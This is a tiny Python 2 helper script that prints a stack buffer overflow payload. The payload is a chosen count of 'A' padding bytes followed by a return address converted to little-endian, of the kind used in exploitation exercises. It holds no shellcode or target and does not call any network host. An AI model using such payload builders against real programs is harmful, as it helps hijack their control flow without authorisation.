#!/usr/bin/python

import sys, struct

def usage():
    print """Usage: ower.py num 0xaddr

             num - num bytes need to owerflow
                      type here - 0 and i convert only addr

             0xaddr - return adress
                      i'm convert addr in litle-endian

                      

             `hj.""" 

if len(sys.argv) < 2:
    usage()
    sys.exit()

addr = ''

if len(sys.argv) == 3:
    if '0x' not in sys.argv[2]:
        print "\n addr must be as 0x08041234 in memory"
        sys.exit()

    addr = int(sys.argv[2], 0)

    addr = struct.pack('<I', addr)

out = ''

if sys.argv[1] != 0:

    for i in range(int(sys.argv[1])):
        out += 'A'

print out + addr
